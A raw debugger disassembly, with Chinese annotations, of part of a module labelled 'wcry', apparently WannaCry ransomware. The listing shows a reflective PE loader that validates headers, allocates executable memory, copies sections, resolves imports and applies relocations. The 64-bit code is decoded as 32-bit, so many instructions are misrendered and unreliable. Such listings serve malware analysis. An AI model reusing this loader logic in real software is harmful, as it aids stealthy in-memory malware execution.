00401F52        0000                    ADD BYTE PTR DS:[EAX],AL
00401F54        0000                    ADD BYTE PTR DS:[EAX],AL
00401F56        0000                    ADD BYTE PTR DS:[EAX],AL
00401F58        0000                    ADD BYTE PTR DS:[EAX],AL
00401F5A        0000                    ADD BYTE PTR DS:[EAX],AL
00401F5C        0000                    ADD BYTE PTR DS:[EAX],AL
00401F5E        0000                    ADD BYTE PTR DS:[EAX],AL
00401F60        0000                    ADD BYTE PTR DS:[EAX],AL
00401F62        0000                    ADD BYTE PTR DS:[EAX],AL
00401F64        0000                    ADD BYTE PTR DS:[EAX],AL
00401F66        0000                    ADD BYTE PTR DS:[EAX],AL
00401F68        0000                    ADD BYTE PTR DS:[EAX],AL
00401F6A        0000                    ADD BYTE PTR DS:[EAX],AL
00401F6C        0000                    ADD BYTE PTR DS:[EAX],AL
00401F6E        0000                    ADD BYTE PTR DS:[EAX],AL
00401F70        0000                    ADD BYTE PTR DS:[EAX],AL
00401F72        0000                    ADD BYTE PTR DS:[EAX],AL
00401F74        0000                    ADD BYTE PTR DS:[EAX],AL
00401F76        0000                    ADD BYTE PTR DS:[EAX],AL
00401F78        0000                    ADD BYTE PTR DS:[EAX],AL
00401F7A        0000                    ADD BYTE PTR DS:[EAX],AL
00401F7C        0000                    ADD BYTE PTR DS:[EAX],AL
00401F7E        0000                    ADD BYTE PTR DS:[EAX],AL
00401F80        0000                    ADD BYTE PTR DS:[EAX],AL
00401F82        0000                    ADD BYTE PTR DS:[EAX],AL
00401F84        0000                    ADD BYTE PTR DS:[EAX],AL
00401F86        0000                    ADD BYTE PTR DS:[EAX],AL
00401F88        0000                    ADD BYTE PTR DS:[EAX],AL
00401F8A        0000                    ADD BYTE PTR DS:[EAX],AL
00401F8C        0000                    ADD BYTE PTR DS:[EAX],AL
00401F8E        0000                    ADD BYTE PTR DS:[EAX],AL
00401F90        0000                    ADD BYTE PTR DS:[EAX],AL
00401F92        0000                    ADD BYTE PTR DS:[EAX],AL
00401F94        0000                    ADD BYTE PTR DS:[EAX],AL
00401F96        0000                    ADD BYTE PTR DS:[EAX],AL
00401F98        0000                    ADD BYTE PTR DS:[EAX],AL
00401F9A        0000                    ADD BYTE PTR DS:[EAX],AL
00401F9C        0000                    ADD BYTE PTR DS:[EAX],AL
00401F9E        0000                    ADD BYTE PTR DS:[EAX],AL
00401FA0        0000                    ADD BYTE PTR DS:[EAX],AL
00401FA2        0000                    ADD BYTE PTR DS:[EAX],AL
00401FA4        0000                    ADD BYTE PTR DS:[EAX],AL
00401FA6        0000                    ADD BYTE PTR DS:[EAX],AL
00401FA8        0000                    ADD BYTE PTR DS:[EAX],AL
00401FAA        0000                    ADD BYTE PTR DS:[EAX],AL
00401FAC        0000                    ADD BYTE PTR DS:[EAX],AL
00401FAE        0000                    ADD BYTE PTR DS:[EAX],AL
00401FB0        0000                    ADD BYTE PTR DS:[EAX],AL
00401FB2        0000                    ADD BYTE PTR DS:[EAX],AL
00401FB4        0000                    ADD BYTE PTR DS:[EAX],AL
00401FB6        0000                    ADD BYTE PTR DS:[EAX],AL
00401FB8        0000                    ADD BYTE PTR DS:[EAX],AL
00401FBA        0000                    ADD BYTE PTR DS:[EAX],AL
00401FBC        0000                    ADD BYTE PTR DS:[EAX],AL
00401FBE        0000                    ADD BYTE PTR DS:[EAX],AL
00401FC0        0000                    ADD BYTE PTR DS:[EAX],AL
00401FC2        0000                    ADD BYTE PTR DS:[EAX],AL
00401FC4        0000                    ADD BYTE PTR DS:[EAX],AL
00401FC6        0000                    ADD BYTE PTR DS:[EAX],AL
00401FC8        0000                    ADD BYTE PTR DS:[EAX],AL
00401FCA        0000                    ADD BYTE PTR DS:[EAX],AL
00401FCC        0000                    ADD BYTE PTR DS:[EAX],AL
00401FCE        48                      DEC EAX
00401FCF        B8 FFFFFFFF             MOV EAX,-1
00401FD4        FFFF                    ???                                                 ;  未知命令
00401FD6        FFFF                    ???                                                 ;  未知命令
00401FD8      ^ E9 2EFCFFFF             JMP wcry.00401C0B
00401FDD        6D                      INS DWORD PTR ES:[EDI],DX                           ;  I/O 命令
00401FDE        73 76                   JNB SHORT wcry.00402056
00401FE0        6372 74                 ARPL WORD PTR DS:[EDX+74],SI
00401FE3        2E:                     PREFIX CS:                                          ;  多余的前缀
00401FE4        64:6C                   INS BYTE PTR ES:[EDI],DX                            ;  I/O 命令
00401FE6        6C                      INS BYTE PTR ES:[EDI],DX                            ;  I/O 命令
00401FE7        006D 73                 ADD BYTE PTR SS:[EBP+73],CH
00401FEA        76 63                   JBE SHORT wcry.0040204F
00401FEC        72 74                   JB SHORT wcry.00402062
00401FEE        64:                     PREFIX FS:                                          ;  多余的前缀
00401FEF        2E:                     PREFIX CS:                                          ;  多余的前缀
00401FF0        64:6C                   INS BYTE PTR ES:[EDI],DX                            ;  I/O 命令
00401FF2        6C                      INS BYTE PTR ES:[EDI],DX                            ;  I/O 命令
00401FF3        0000                    ADD BYTE PTR DS:[EAX],AL
00401FF5        0000                    ADD BYTE PTR DS:[EAX],AL
00401FF7        0000                    ADD BYTE PTR DS:[EAX],AL
00401FF9        0000                    ADD BYTE PTR DS:[EAX],AL
00401FFB        0000                    ADD BYTE PTR DS:[EAX],AL
00401FFD        0000                    ADD BYTE PTR DS:[EAX],AL
00401FFF        0000                    ADD BYTE PTR DS:[EAX],AL
00402001        0000                    ADD BYTE PTR DS:[EAX],AL
00402003        0000                    ADD BYTE PTR DS:[EAX],AL
00402005        0000                    ADD BYTE PTR DS:[EAX],AL
00402007        0000                    ADD BYTE PTR DS:[EAX],AL
00402009        0000                    ADD BYTE PTR DS:[EAX],AL
0040200B        0000                    ADD BYTE PTR DS:[EAX],AL
0040200D        0000                    ADD BYTE PTR DS:[EAX],AL
0040200F        0000                    ADD BYTE PTR DS:[EAX],AL
00402011        0000                    ADD BYTE PTR DS:[EAX],AL
00402013        0000                    ADD BYTE PTR DS:[EAX],AL
00402015        0000                    ADD BYTE PTR DS:[EAX],AL
00402017        0000                    ADD BYTE PTR DS:[EAX],AL
00402019        0000                    ADD BYTE PTR DS:[EAX],AL
0040201B        0000                    ADD BYTE PTR DS:[EAX],AL
0040201D        0000                    ADD BYTE PTR DS:[EAX],AL
0040201F        0000                    ADD BYTE PTR DS:[EAX],AL
00402021        0000                    ADD BYTE PTR DS:[EAX],AL
00402023        0057 52                 ADD BYTE PTR DS:[EDI+52],DL
00402026        53                      PUSH EBX
00402027        48                      DEC EAX
00402028        897D 00                 MOV DWORD PTR SS:[EBP],EDI
0040202B        48                      DEC EAX
0040202C        89FA                    MOV EDX,EDI
0040202E        48                      DEC EAX
0040202F        83C2 00                 ADD EDX,0
00402032        66:8B1A                 MOV BX,WORD PTR DS:[EDX]
00402035        66:81FB 4D5A            CMP BX,5A4D
0040203A        75 63                   JNZ SHORT wcry.0040209F
0040203C        48                      DEC EAX
0040203D        89FA                    MOV EDX,EDI
0040203F        48                      DEC EAX
00402040        83C2 3C                 ADD EDX,3C
00402043        48                      DEC EAX
00402044        31DB                    XOR EBX,EBX
00402046        8B1A                    MOV EBX,DWORD PTR DS:[EDX]
00402048        48                      DEC EAX
00402049        01DF                    ADD EDI,EBX
0040204B        48                      DEC EAX
0040204C        897D 08                 MOV DWORD PTR SS:[EBP+8],EDI
0040204F        48                      DEC EAX
00402050        89FA                    MOV EDX,EDI
00402052        48                      DEC EAX
00402053        83C2 00                 ADD EDX,0
00402056        8B1A                    MOV EBX,DWORD PTR DS:[EDX]
00402058        81FB 50450000           CMP EBX,4550
0040205E        75 3F                   JNZ SHORT wcry.0040209F
00402060        48                      DEC EAX
00402061        89FA                    MOV EDX,EDI
00402063        48                      DEC EAX
00402064        83C2 18                 ADD EDX,18
00402067        66:8B1A                 MOV BX,WORD PTR DS:[EDX]
0040206A        66:81FB 0B02            CMP BX,20B
0040206F        75 2E                   JNZ SHORT wcry.0040209F
00402071        48                      DEC EAX
00402072        89FA                    MOV EDX,EDI
00402074        48                      DEC EAX
00402075        83C2 14                 ADD EDX,14
00402078        48                      DEC EAX
00402079        31DB                    XOR EBX,EBX
0040207B        66:8B1A                 MOV BX,WORD PTR DS:[EDX]
0040207E        48                      DEC EAX
0040207F        89FA                    MOV EDX,EDI
00402081        48                      DEC EAX
00402082        83C2 18                 ADD EDX,18
00402085        48                      DEC EAX
00402086        01DA                    ADD EDX,EBX
00402088        48                      DEC EAX
00402089        8955 10                 MOV DWORD PTR SS:[EBP+10],EDX
0040208C        48                      DEC EAX
0040208D        89FA                    MOV EDX,EDI
0040208F        48                      DEC EAX
00402090        81C2 88000000           ADD EDX,88
00402096        48                      DEC EAX
00402097        8955 18                 MOV DWORD PTR SS:[EBP+18],EDX
0040209A        48                      DEC EAX
0040209B        31C0                    XOR EAX,EAX
0040209D        EB 06                   JMP SHORT wcry.004020A5
0040209F        48                      DEC EAX
004020A0        31C0                    XOR EAX,EAX
004020A2        48                      DEC EAX
004020A3        F7D0                    NOT EAX
004020A5        5B                      POP EBX
004020A6        5A                      POP EDX
004020A7        5F                      POP EDI
004020A8        C3                      RETN
004020A9        57                      PUSH EDI
004020AA        52                      PUSH EDX
004020AB        53                      PUSH EBX
004020AC        48                      DEC EAX
004020AD        8B7D 08                 MOV EDI,DWORD PTR SS:[EBP+8]
004020B0        48                      DEC EAX
004020B1        83C7 50                 ADD EDI,50
004020B4        48                      DEC EAX
004020B5        31DB                    XOR EBX,EBX
004020B7        8B1F                    MOV EBX,DWORD PTR DS:[EDI]
004020B9        48                      DEC EAX
004020BA        895D 50                 MOV DWORD PTR SS:[EBP+50],EBX
004020BD        48                      DEC EAX
004020BE        8B7D 08                 MOV EDI,DWORD PTR SS:[EBP+8]
004020C1        48                      DEC EAX
004020C2        83C7 30                 ADD EDI,30
004020C5        48                      DEC EAX
004020C6        8B17                    MOV EDX,DWORD PTR DS:[EDI]
004020C8        49                      DEC ECX
004020C9        B9 40000000             MOV ECX,40
004020CE        0000                    ADD BYTE PTR DS:[EAX],AL
004020D0        0000                    ADD BYTE PTR DS:[EAX],AL
004020D2        49                      DEC ECX
004020D3        B8 00300000             MOV EAX,3000
004020D8        0000                    ADD BYTE PTR DS:[EAX],AL
004020DA        0000                    ADD BYTE PTR DS:[EAX],AL
004020DC        48                      DEC EAX
004020DD        89D1                    MOV ECX,EDX
004020DF        48                      DEC EAX
004020E0        89DA                    MOV EDX,EBX
004020E2        48                      DEC EAX
004020E3        83EC 20                 SUB ESP,20
004020E6        FF56 08                 CALL DWORD PTR DS:[ESI+8]
004020E9        48                      DEC EAX
004020EA        83C4 20                 ADD ESP,20
004020ED        48                      DEC EAX
004020EE        85C0                    TEST EAX,EAX
004020F0        75 25                   JNZ SHORT wcry.00402117
004020F2        49                      DEC ECX
004020F3        B9 40000000             MOV ECX,40
004020F8        0000                    ADD BYTE PTR DS:[EAX],AL
004020FA        0000                    ADD BYTE PTR DS:[EAX],AL
004020FC        49                      DEC ECX
004020FD        B8 00300000             MOV EAX,3000
00402102        0000                    ADD BYTE PTR DS:[EAX],AL
00402104        0000                    ADD BYTE PTR DS:[EAX],AL
00402106        48                      DEC EAX
00402107        89DA                    MOV EDX,EBX
00402109        48                      DEC EAX
0040210A        31C9                    XOR ECX,ECX
0040210C        48                      DEC EAX
0040210D        83EC 20                 SUB ESP,20
00402110        FF56 08                 CALL DWORD PTR DS:[ESI+8]
00402113        48                      DEC EAX
00402114        83C4 20                 ADD ESP,20
00402117        5B                      POP EBX
00402118        5A                      POP EDX
00402119        5F                      POP EDI
0040211A        C3                      RETN
0040211B        57                      PUSH EDI
0040211C        52                      PUSH EDX
0040211D        53                      PUSH EBX
0040211E        51                      PUSH ECX
0040211F        56                      PUSH ESI
00402120        48                      DEC EAX
00402121        8B76 48                 MOV ESI,DWORD PTR DS:[ESI+48]
00402124        48                      DEC EAX
00402125        8B7D 20                 MOV EDI,DWORD PTR SS:[EBP+20]
00402128        48                      DEC EAX
00402129        8B5D 08                 MOV EBX,DWORD PTR SS:[EBP+8]
0040212C        48                      DEC EAX
0040212D        83C3 54                 ADD EBX,54
00402130        48                      DEC EAX
00402131        31C9                    XOR ECX,ECX
00402133        8B0B                    MOV ECX,DWORD PTR DS:[EBX]
00402135        F3:A4                   REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]
00402137        5E                      POP ESI
00402138        48                      DEC EAX
00402139        8B7D 08                 MOV EDI,DWORD PTR SS:[EBP+8]
0040213C        48                      DEC EAX
0040213D        83C7 06                 ADD EDI,6
00402140        48                      DEC EAX
00402141        31DB                    XOR EBX,EBX
00402143        66:8B1F                 MOV BX,WORD PTR DS:[EDI]
00402146        48                      DEC EAX
00402147        31D2                    XOR EDX,EDX
00402149        48                      DEC EAX
0040214A        39D3                    CMP EBX,EDX
0040214C        74 4D                   JE SHORT wcry.0040219B
0040214E        48                      DEC EAX
0040214F        B8 28000000             MOV EAX,28
00402154        0000                    ADD BYTE PTR DS:[EAX],AL
00402156        0000                    ADD BYTE PTR DS:[EAX],AL
00402158        52                      PUSH EDX
00402159        48                      DEC EAX
0040215A        F7E2                    MUL EDX
0040215C        5A                      POP EDX
0040215D        48                      DEC EAX
0040215E        0345 10                 ADD EAX,DWORD PTR SS:[EBP+10]
00402161        56                      PUSH ESI
00402162        48                      DEC EAX
00402163        8B76 48                 MOV ESI,DWORD PTR DS:[ESI+48]
00402166        48                      DEC EAX
00402167        89C1                    MOV ECX,EAX
00402169        48                      DEC EAX
0040216A        83C1 14                 ADD ECX,14
0040216D        4D                      DEC EBP
0040216E        31D2                    XOR EDX,EDX
00402170        44                      INC ESP
00402171        8B11                    MOV EDX,DWORD PTR DS:[ECX]
00402173        4C                      DEC ESP
00402174        01D6                    ADD ESI,EDX
00402176        48                      DEC EAX
00402177        8B7D 20                 MOV EDI,DWORD PTR SS:[EBP+20]
0040217A        48                      DEC EAX
0040217B        89C1                    MOV ECX,EAX
0040217D        48                      DEC EAX
0040217E        83C1 0C                 ADD ECX,0C
00402181        4D                      DEC EBP
00402182        31D2                    XOR EDX,EDX
00402184        44                      INC ESP
00402185        8B11                    MOV EDX,DWORD PTR DS:[ECX]
00402187        4C                      DEC ESP
00402188        01D7                    ADD EDI,EDX
0040218A        48                      DEC EAX
0040218B        83C0 10                 ADD EAX,10
0040218E        48                      DEC EAX
0040218F        31C9                    XOR ECX,ECX
00402191        8B08                    MOV ECX,DWORD PTR DS:[EAX]
00402193        F3:A4                   REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]
00402195        5E                      POP ESI
00402196        48                      DEC EAX
00402197        FFC2                    INC EDX
00402199      ^ EB AE                   JMP SHORT wcry.00402149
0040219B        48                      DEC EAX
0040219C        31C0                    XOR EAX,EAX
0040219E        EB 06                   JMP SHORT wcry.004021A6
004021A0        48                      DEC EAX
004021A1        31C0                    XOR EAX,EAX
004021A3        48                      DEC EAX
004021A4        F7D0                    NOT EAX
004021A6        59                      POP ECX
004021A7        5B                      POP EBX
004021A8        5A                      POP EDX
004021A9        5F                      POP EDI
004021AA        C3                      RETN
004021AB        57                      PUSH EDI
004021AC        52                      PUSH EDX
004021AD        53                      PUSH EBX
004021AE        51                      PUSH ECX
004021AF        48                      DEC EAX
004021B0        8B7D 20                 MOV EDI,DWORD PTR SS:[EBP+20]
004021B3        E8 6CFEFFFF             CALL wcry.00402024
004021B8        48                      DEC EAX
004021B9        85C0                    TEST EAX,EAX
004021BB        0F85 50010000           JNZ wcry.00402311
004021C1        E8 1F050000             CALL wcry.004026E5
004021C6        48                      DEC EAX
004021C7        85C0                    TEST EAX,EAX
004021C9        0F85 42010000           JNZ wcry.00402311
004021CF        48                      DEC EAX
004021D0        8B7D 00                 MOV EDI,DWORD PTR SS:[EBP]
004021D3        48                      DEC EAX
004021D4        B8 08000000             MOV EAX,8
004021D9        0000                    ADD BYTE PTR DS:[EAX],AL
004021DB        0000                    ADD BYTE PTR DS:[EAX],AL
004021DD        48                      DEC EAX
004021DE        BA 01000000             MOV EDX,1
004021E3        0000                    ADD BYTE PTR DS:[EAX],AL
004021E5        0000                    ADD BYTE PTR DS:[EAX],AL
004021E7        48                      DEC EAX
004021E8        F7E2                    MUL EDX
004021EA        48                      DEC EAX
004021EB        8B55 18                 MOV EDX,DWORD PTR SS:[EBP+18]
004021EE        48                      DEC EAX
004021EF        01C2                    ADD EDX,EAX
004021F1        48                      DEC EAX
004021F2        83C2 00                 ADD EDX,0
004021F5        48                      DEC EAX
004021F6        31DB                    XOR EBX,EBX
004021F8        8B1A                    MOV EBX,DWORD PTR DS:[EDX]
004021FA        48                      DEC EAX
004021FB        01FB                    ADD EBX,EDI
004021FD        48                      DEC EAX
004021FE        895D 30                 MOV DWORD PTR SS:[EBP+30],EBX
00402201        48                      DEC EAX
00402202        39FB                    CMP EBX,EDI
00402204        0F84 0F010000           JE wcry.00402319
0040220A        49                      DEC ECX
0040220B        89DA                    MOV EDX,EBX
0040220D        49                      DEC ECX
0040220E        83C2 10                 ADD EDX,10
00402211        48                      DEC EAX
00402212        31C0                    XOR EAX,EAX
00402214        41                      INC ECX
00402215        8B02                    MOV EAX,DWORD PTR DS:[EDX]
00402217        48                      DEC EAX
00402218        85C0                    TEST EAX,EAX
0040221A        0F84 F9000000           JE wcry.00402319
00402220        48                      DEC EAX
00402221        8B45 00                 MOV EAX,DWORD PTR SS:[EBP]
00402224        48                      DEC EAX
00402225        89DA                    MOV EDX,EBX
00402227        48                      DEC EAX
00402228        83C2 0C                 ADD EDX,0C
0040222B        4D                      DEC EBP
0040222C        31D2                    XOR EDX,EDX
0040222E        44                      INC ESP
0040222F        8B12                    MOV EDX,DWORD PTR DS:[EDX]
00402231        4C                      DEC ESP
00402232        01D0                    ADD EAX,EDX
00402234        48                      DEC EAX
00402235        89C1                    MOV ECX,EAX
00402237        48                      DEC EAX
00402238        83EC 20                 SUB ESP,20
0040223B        FF56 18                 CALL DWORD PTR DS:[ESI+18]
0040223E        48                      DEC EAX
0040223F        83C4 20                 ADD ESP,20
00402242        48                      DEC EAX
00402243        85C0                    TEST EAX,EAX
00402245        0F84 C6000000           JE wcry.00402311
0040224B        48                      DEC EAX
0040224C        8945 48                 MOV DWORD PTR SS:[EBP+48],EAX
0040224F        48                      DEC EAX
00402250        89DA                    MOV EDX,EBX
00402252        48                      DEC EAX
00402253        83C2 00                 ADD EDX,0
00402256        48                      DEC EAX
00402257        8B7D 00                 MOV EDI,DWORD PTR SS:[EBP]
0040225A        4D                      DEC EBP
0040225B        31D2                    XOR EDX,EDX
0040225D        44                      INC ESP
0040225E        8B12                    MOV EDX,DWORD PTR DS:[EDX]
00402260        4C                      DEC ESP
00402261        01D7                    ADD EDI,EDX
00402263        48                      DEC EAX
00402264        897D 38                 MOV DWORD PTR SS:[EBP+38],EDI
00402267        48                      DEC EAX
00402268        89DA                    MOV EDX,EBX
0040226A        48                      DEC EAX
0040226B        83C2 10                 ADD EDX,10
0040226E        48                      DEC EAX
0040226F        8B7D 00                 MOV EDI,DWORD PTR SS:[EBP]
00402272        4D                      DEC EBP
00402273        31D2                    XOR EDX,EDX
00402275        44                      INC ESP
00402276        8B12                    MOV EDX,DWORD PTR DS:[EDX]
00402278        4C                      DEC ESP
00402279        01D7                    ADD EDI,EDX
0040227B        48                      DEC EAX
0040227C        897D 40                 MOV DWORD PTR SS:[EBP+40],EDI
0040227F        48                      DEC EAX
00402280        8B55 38                 MOV EDX,DWORD PTR SS:[EBP+38]
00402283        48                      DEC EAX
00402284        8B12                    MOV EDX,DWORD PTR DS:[EDX]
00402286        48                      DEC EAX
00402287        85D2                    TEST EDX,EDX
00402289        74 7D                   JE SHORT wcry.00402308
0040228B        48                      DEC EAX
0040228C        89D7                    MOV EDI,EDX
0040228E        49                      DEC ECX
0040228F        BA 00000000             MOV EDX,0
00402294        0000                    ADD BYTE PTR DS:[EAX],AL
00402296        0080 4C21D774           ADD BYTE PTR DS:[EAX+74D7214C],AL
0040229C        0C 48                   OR AL,48
0040229E        89D7                    MOV EDI,EDX
004022A0        48                      DEC EAX
004022A1        81E7 FFFF0000           AND EDI,0FFFF
004022A7        EB 0B                   JMP SHORT wcry.004022B4
004022A9        48                      DEC EAX
004022AA        8B7D 00                 MOV EDI,DWORD PTR SS:[EBP]
004022AD        48                      DEC EAX
004022AE        01D7                    ADD EDI,EDX
004022B0        48                      DEC EAX
004022B1        83C7 02                 ADD EDI,2
004022B4        48                      DEC EAX
004022B5        89FA                    MOV EDX,EDI
004022B7        48                      DEC EAX
004022B8        8B4D 48                 MOV ECX,DWORD PTR SS:[EBP+48]
004022BB        48                      DEC EAX
004022BC        83EC 20                 SUB ESP,20
004022BF        FF56 20                 CALL DWORD PTR DS:[ESI+20]
004022C2        48                      DEC EAX
004022C3        83C4 20                 ADD ESP,20
004022C6        48                      DEC EAX
004022C7        85C0                    TEST EAX,EAX
004022C9        74 46                   JE SHORT wcry.00402311
004022CB        48                      DEC EAX
004022CC        8B55 40                 MOV EDX,DWORD PTR SS:[EBP+40]
004022CF        48                      DEC EAX
004022D0        8902                    MOV DWORD PTR DS:[EDX],EAX
004022D2        E8 07060000             CALL wcry.004028DE
004022D7        48                      DEC EAX
004022D8        85C0                    TEST EAX,EAX
004022DA        74 0F                   JE SHORT wcry.004022EB
004022DC        E8 97050000             CALL wcry.00402878
004022E1        48                      DEC EAX
004022E2        85C0                    TEST EAX,EAX
004022E4        75 05                   JNZ SHORT wcry.004022EB
004022E6        E8 F0040000             CALL wcry.004027DB
004022EB        48                      DEC EAX
004022EC        8B55 38                 MOV EDX,DWORD PTR SS:[EBP+38]
004022EF        48                      DEC EAX
004022F0        83C2 08                 ADD EDX,8
004022F3        48                      DEC EAX
004022F4        8955 38                 MOV DWORD PTR SS:[EBP+38],EDX
004022F7        48                      DEC EAX
004022F8        8B55 40                 MOV EDX,DWORD PTR SS:[EBP+40]
004022FB        48                      DEC EAX
004022FC        83C2 08                 ADD EDX,8
004022FF        48                      DEC EAX
00402300        8955 40                 MOV DWORD PTR SS:[EBP+40],EDX
00402303      ^ E9 77FFFFFF             JMP wcry.0040227F
00402308        48                      DEC EAX
00402309        83C3 14                 ADD EBX,14
0040230C      ^ E9 F9FEFFFF             JMP wcry.0040220A
00402311        48                      DEC EAX
00402312        31C0                    XOR EAX,EAX
00402314        48                      DEC EAX
00402315        F7D0                    NOT EAX
00402317        EB 03                   JMP SHORT wcry.0040231C
00402319        48                      DEC EAX
0040231A        31C0                    XOR EAX,EAX
0040231C        59                      POP ECX
0040231D        5B                      POP EBX
0040231E        5A                      POP EDX
0040231F        5F                      POP EDI
00402320        C3                      RETN
00402321        57                      PUSH EDI
00402322        52                      PUSH EDX
00402323        48                      DEC EAX
00402324        8B7D 08                 MOV EDI,DWORD PTR SS:[EBP+8]
00402327        48                      DEC EAX
00402328        83C7 30                 ADD EDI,30
0040232B        48                      DEC EAX
0040232C        8B55 20                 MOV EDX,DWORD PTR SS:[EBP+20]
0040232F        48                      DEC EAX
00402330        8917                    MOV DWORD PTR DS:[EDI],EDX
00402332        48                      DEC EAX
00402333        31C0                    XOR EAX,EAX
00402335        5A                      POP EDX
00402336        5F                      POP EDI
00402337        C3                      RETN
00402338        57                      PUSH EDI
00402339        52                      PUSH EDX
0040233A        53                      PUSH EBX
0040233B        51                      PUSH ECX
0040233C        48                      DEC EAX
0040233D        8B55 28                 MOV EDX,DWORD PTR SS:[EBP+28]
00402340        48                      DEC EAX
00402341        85D2                    TEST EDX,EDX
00402343        0F84 F5000000           JE wcry.0040243E
00402349        48                      DEC EAX
0040234A        B8 08000000             MOV EAX,8
0040234F        0000                    ADD BYTE PTR DS:[EAX],AL
00402351        0000                    ADD BYTE PTR DS:[EAX],AL
00402353        48                      DEC EAX
00402354        BA 05000000             MOV EDX,5
00402359        0000                    ADD BYTE PTR DS:[EAX],AL
0040235B        0000                    ADD BYTE PTR DS:[EAX],AL
0040235D        48                      DEC EAX
0040235E        F7E2                    MUL EDX
00402360        48                      DEC EAX
00402361        8B55 18                 MOV EDX,DWORD PTR SS:[EBP+18]
00402364        48                      DEC EAX
00402365        01C2                    ADD EDX,EAX
00402367        49                      DEC ECX
00402368        89D2                    MOV EDX,EDX
0040236A        49                      DEC ECX
0040236B        83C2 04                 ADD EDX,4
0040236E        48                      DEC EAX
0040236F        31FF                    XOR EDI,EDI
00402371        41                      INC ECX
00402372        8B3A                    MOV EDI,DWORD PTR DS:[EDX]
00402374        48                      DEC EAX
00402375        85FF                    TEST EDI,EDI
00402377        0F84 C1000000           JE wcry.0040243E
0040237D        49                      DEC ECX
0040237E        89D2                    MOV EDX,EDX
00402380        49                      DEC ECX
00402381        83C2 00                 ADD EDX,0
00402384        48                      DEC EAX
00402385        31FF                    XOR EDI,EDI
00402387        41                      INC ECX
00402388        8B3A                    MOV EDI,DWORD PTR DS:[EDX]
0040238A        48                      DEC EAX
0040238B        85FF                    TEST EDI,EDI
0040238D        0F84 A3000000           JE wcry.00402436
00402393        48                      DEC EAX
00402394        8B55 20                 MOV EDX,DWORD PTR SS:[EBP+20]
00402397        48                      DEC EAX
00402398        01FA                    ADD EDX,EDI
0040239A        49                      DEC ECX
0040239B        89D2                    MOV EDX,EDX
0040239D        49                      DEC ECX
0040239E        83C2 04                 ADD EDX,4
004023A1        41                      INC ECX
004023A2        8B3A                    MOV EDI,DWORD PTR DS:[EDX]
004023A4        48                      DEC EAX
004023A5        85FF                    TEST EDI,EDI
004023A7        0F84 91000000           JE wcry.0040243E
004023AD        48                      DEC EAX
004023AE        83EF 08                 SUB EDI,8
004023B1        48                      DEC EAX
004023B2        D1EF                    SHR EDI,1
004023B4        48                      DEC EAX
004023B5        31C9                    XOR ECX,ECX
004023B7        48                      DEC EAX
004023B8        39F9                    CMP ECX,EDI
004023BA        74 65                   JE SHORT wcry.00402421
004023BC        48                      DEC EAX
004023BD        89D3                    MOV EBX,EDX
004023BF        48                      DEC EAX
004023C0        83C3 08                 ADD EBX,8
004023C3        48                      DEC EAX
004023C4        89C8                    MOV EAX,ECX
004023C6        48                      DEC EAX
004023C7        D1E0                    SHL EAX,1
004023C9        48                      DEC EAX
004023CA        01C3                    ADD EBX,EAX
004023CC        48                      DEC EAX
004023CD        C745 58 00000000        MOV DWORD PTR SS:[EBP+58],0
004023D4        66:8B03                 MOV AX,WORD PTR DS:[EBX]
004023D7        66:25 00F0              AND AX,0F000
004023DB        66:C1E8 0C              SHR AX,0C
004023DF        66:83F8 00              CMP AX,0
004023E3        74 37                   JE SHORT wcry.0040241C
004023E5        66:83F8 03              CMP AX,3
004023E9        74 06                   JE SHORT wcry.004023F1
004023EB        66:83F8 0A              CMP AX,0A
004023EF        75 2B                   JNZ SHORT wcry.0040241C
004023F1        49                      DEC ECX
004023F2        89D2                    MOV EDX,EDX
004023F4        49                      DEC ECX
004023F5        83C2 00                 ADD EDX,0
004023F8        41                      INC ECX
004023F9        8B02                    MOV EAX,DWORD PTR DS:[EDX]
004023FB        48                      DEC EAX
004023FC        8945 58                 MOV DWORD PTR SS:[EBP+58],EAX
004023FF        48                      DEC EAX
00402400        31C0                    XOR EAX,EAX
00402402        66:8B03                 MOV AX,WORD PTR DS:[EBX]
00402405        66:25 FF0F              AND AX,0FFF
00402409        48                      DEC EAX
0040240A        0145 58                 ADD DWORD PTR SS:[EBP+58],EAX
0040240D        48                      DEC EAX
0040240E        8B45 20                 MOV EAX,DWORD PTR SS:[EBP+20]
00402411        48                      DEC EAX
00402412        0345 58                 ADD EAX,DWORD PTR SS:[EBP+58]
00402415        48                      DEC EAX
00402416        8B5D 28                 MOV EBX,DWORD PTR SS:[EBP+28]
00402419        48                      DEC EAX
0040241A        0118                    ADD DWORD PTR DS:[EAX],EBX
0040241C        48                      DEC EAX
0040241D        FFC1                    INC ECX
0040241F      ^ EB 96                   JMP SHORT wcry.004023B7
00402421        49                      DEC ECX
00402422        89D2                    MOV EDX,EDX
00402424        49                      DEC ECX
00402425        83C2 04                 ADD EDX,4
00402428        48                      DEC EAX
00402429        31FF                    XOR EDI,EDI
0040242B        41                      INC ECX
0040242C        8B3A                    MOV EDI,DWORD PTR DS:[EDX]
0040242E        48                      DEC EAX
0040242F        01FA                    ADD EDX,EDI
00402431      ^ E9 64FFFFFF             JMP wcry.0040239A
00402436        48                      DEC EAX
00402437        31C0                    XOR EAX,EAX
00402439        48                      DEC EAX
0040243A        F7D0                    NOT EAX
0040243C        EB 03                   JMP SHORT wcry.00402441
0040243E        48                      DEC EAX
0040243F        31C0                    XOR EAX,EAX
00402441        59                      POP ECX
00402442        5B                      POP EBX
00402443        5A                      POP EDX
00402444        5F                      POP EDI
00402445        C3                      RETN
00402446        57                      PUSH EDI
00402447        52                      PUSH EDX
00402448        53                      PUSH EBX
00402449        51                      PUSH ECX
0040244A        48                      DEC EAX
0040244B        B8 08000000             MOV EAX,8
00402450        0000                    ADD BYTE PTR DS:[EAX],AL
00402452        0000                    ADD BYTE PTR DS:[EAX],AL
00402454        48                      DEC EAX
00402455        BA 03000000             MOV EDX,3
0040245A        0000                    ADD BYTE PTR DS:[EAX],AL
0040245C        0000                    ADD BYTE PTR DS:[EAX],AL
0040245E        48                      DEC EAX
0040245F        F7E2                    MUL EDX
00402461        48                      DEC EAX
00402462        8B55 18                 MOV EDX,DWORD PTR SS:[EBP+18]
00402465        48                      DEC EAX
00402466        01C2                    ADD EDX,EAX
00402468        48                      DEC EAX
00402469        89D1                    MOV ECX,EDX
0040246B        48                      DEC EAX
0040246C        83C1 04                 ADD ECX,4
0040246F        48                      DEC EAX
00402470        31C0                    XOR EAX,EAX
00402472        8B01                    MOV EAX,DWORD PTR DS:[ECX]
00402474        48                      DEC EAX
00402475        85C0                    TEST EAX,EAX
